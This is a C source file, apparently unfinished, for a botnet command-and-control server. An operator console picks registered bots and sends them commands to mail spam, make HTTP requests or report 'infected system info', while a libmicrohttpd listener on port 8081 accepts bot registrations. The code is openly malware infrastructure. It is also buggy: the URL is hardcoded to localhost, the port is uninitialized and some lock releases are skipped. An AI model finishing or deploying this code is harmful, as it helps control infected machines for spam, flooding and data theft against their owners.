
#include "common.h"
#define PAGE "<html><head><title>libmicrohttpd demo</title>" \
             "</head><body>libmicrohttpd demo</body></html>"

// BRAINSTORMING

/*
    p1 -> always on, get commands from cli and execute them
    p2 -> alway on, accept connections from bot in order to register themc -> P2_CONN TCP

    p1 and p2 need to access a shared resource (active_bots):
    - p2 write on in -> producer
    - p1 read from it and update its contents -> consumer

    should I create a c1 process (child of p1)  or a p3 process
    that leaves a open UDP connection in order
    to update bots active state?

    active_bots -> Critical section
    botExists, list_botnet , sendCommand -> unsafe for now
*/

// BOT -> Critical section

active_bots *botnet;
sem_t r, w;
int readcount, ret, sock_fd;

int botExists(int bot_id);
int list_botnet(int active);
void sendCommand(char *command, int bot_id);
int initializeSemaphores();
int closeSemaphores();
void parent(int pid);
void child();
void hello();

int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
      const char *method, const char *version, const char *upload_data,
      size_t *upload_data_size, void **con_cls)
{
   const char *msg = "OK";
   struct MHD_Response *response;
   int ret;

   response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
   ret = MHD_queue_response(connection, MHD_HTTP_OK, response);



   MHD_destroy_response(response);

   return ret;
}

int main(int argc, char const *argv[])
{
    /* Accept connections from bots

        accept
        receive info and save them in active_bots;
        send close message
        close connection
    */

    int bot_fd, pid;

    ret = initializeSemaphores();


    botnet = (active_bots *)malloc(sizeof(active_bots));
    botnet->next = NULL;


    pid = fork();
    if (pid < 0)
    {
        handle_error("cannot fork");
    }
    else if (pid == 0)
    {
        if (DEBUG)
            printf("Child process working,handle bot connection \n");

        child();
    }
    else
    {
        printf("Parent process working, send commands \n");

        parent(pid);
    }

    return 0;
}

/*
    active == true -> list active bots
    active == false -> list all registered bots
*/
int list_botnet(int active)
{

    int ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }

    if (botnet == NULL)
    {
        printf("Botnet is empty");
        return -1;
    }

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (active == 1)
        {

            char bot_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(bot->bot_address.sin_addr), bot_ip, INET_ADDRSTRLEN);
            inet_ntop(bot->bot_address.sin_family, &(bot->target_address), target_ip, INET_ADDRSTRLEN);

            printf("BOT_ID: %d - IP: %s - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->action, target_ip);
        }
        else
        {
            printf("BOT_ID: %d \n", bot->bot_id);
        }

        bot = bot->next;
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }

    return 1;
}

int botExists(int bot_id)
{

    int ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }

    readcount++;

    if (readcount == 1)
    {

        ret = sem_wait(&w);
        if (ret < 0)
        {
            handle_error("Error in wait sem w");
        }
    }

    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }

    if (botnet == NULL)
        return -1;

    active_bots *bot = botnet;

    while (bot != NULL)
    {
        if (bot->bot_id == bot_id)
        {
            return 1;
        }

        bot = bot->next;
    }

    ret = sem_wait(&r);
    if (ret < 0)
    {
        handle_error("Error in wait sem w");
    }
    readcount--;
    if (readcount == 0)
        ret = sem_post(&w);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    ret = sem_post(&r);
    if (ret < 0)
    {
        handle_error("Error in post sem w");
    }
    return -1;
}

/*
 * Instanciate TCP connection in order to track current bots -> another fork?
 * use libcurl
 * email -> send array of email addresses, content
 * HTTP_REQ -> send http request as string "e.g curl ..."
 * SYS_INFO -> nothing
 */
void sendCommand(char *command, int bot_id)
{

    CURL *curl;

    curl = curl_easy_init();

    if (curl == NULL)
        handle_error("Could not execute command, error initializing curl handle");
    else
    {

        CURLcode res;

        char url[30] = ""; // TODO this should be a malloc with size of parameters, (8 + ? + 10)
        char bot_ip[INET_ADDRSTRLEN];
        long bot_port; // TODO this should be extracted from bot structure

        // TODO write a function that fill bot_id and bot_ip side effect

        // inet_ntop(AF_INET, &(bot->bot_address.sin_addr), bot_ip, INET_ADDRSTRLEN);

        strcat(url, "http://");
        strcat(url, "localhost"); // TODO this must be the bot ip

        printf("%s \n", url);

        curl_easy_setopt(curl, CURLOPT_PORT, bot_port);

        if (strcmp(command, HTTP_REQ) == 0)
        {
            printf("Sending http request ");

            strcat(url, "/http_req");

            // TODO add request body
        }

        if (strcmp(command, EMAIL) == 0)
        {
            printf("Sending emails ");

            strcat(url, "/email");

            // TODO add request body
        }
        if (strcmp(command, SYS_INFO) == 0)
        {
            printf("Retrieving infected system info to: ");

            strcat(url, "/sys_info");

            curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        }

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

int initializeSemaphores()
{

    int ret;

    ret = sem_init(&r, 1, 10);
    if (ret < 0)
        handle_error("Cannot init sem r");
    ret = sem_init(&w, 1, 1);
    if (ret < 0)
        handle_error("Cannot init sem w");
    return ret;
}
int closeSemaphores()
{

    int ret;

    ret = sem_destroy(&r);
    if (ret < 0)
        handle_error("Cannot close sem r");
    ret = sem_destroy(&w);
    if (ret < 0)
        handle_error("Cannot close sem w");
    return ret;
}

void parent(int pid)
{
    while (1)
    {

        char command[10];
        printf("\nInsert Command : \n");
        fgets(command, 10, stdin);

        if (strcmp(command, LIST) == 0)
        {
            printf("Listing active bots of current botnet \n");

            list_botnet(1);
        }
        else if (strcmp(command, QUIT) == 0)
        {
            printf("Stop C&C \n");
            free(botnet);

            ret = closeSemaphores();
            if (ret < 0)
            {
                handle_error("Failed to close semaphores");
            }
            ret = close(sock_fd);
            if (ret < 0)
            {
                handle_error("Failed to close socket");
            }

            kill(pid, SIGKILL);

            exit(EXIT_SUCCESS);
        }
        // maybe just one or multiple | statements

        else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
        {
            printf("Choose bot to which send command \n");

            ret = list_botnet(0);

            if (ret < 0)
                continue;

            char bot_id[100];
            fgets(bot_id, 100, stdin);
            int bot = atoi(bot_id);

            if (botExists(bot) < 0)
            {
                printf("Not a valid bot id \n");
                continue;
            }
            else
            {
                sendCommand(command, bot);
            }
        }
        else
        {
            printf("Error, command not supported choose one from the following available commands: \n %s \n %s \n %s \n %s \n %s \n ",
                   HTTP_REQ, LIST, EMAIL, SYS_INFO, QUIT);

            continue;
        }
    }
}

void child()
{

   struct MHD_Daemon *daemon;

      daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
      if (daemon == NULL) {
         fprintf(stderr, "Error starting daemon.\n");
         _exit(EXIT_FAILURE);
      }

       fprintf(stdout, "Child process started. Listening on port %d.\n", 8081);
      while(1) { sleep(1); }

    
}

/*

    struct sockaddr_in server_addr = {0}, client_addr = {0};
    int sockaddr_len = sizeof(struct sockaddr_in);
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0)
    {
        handle_error("Socket not initialized");
    }

    printf("Socket created \n");

    server_addr.sin_addr.s_addr = INADDR_ANY; // we want to accept connections from any interface
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    ret = bind(sock_fd, (struct sockaddr *)&server_addr, sockaddr_len);
    if (ret < 0)
    {
        handle_error("Cannot bind address to socket");
    }

    ret = listen(sock_fd, MAX_CONN_QUEUE);
    if (ret < 0)
    {
        handle_error("Listen on socket error");
    }

*/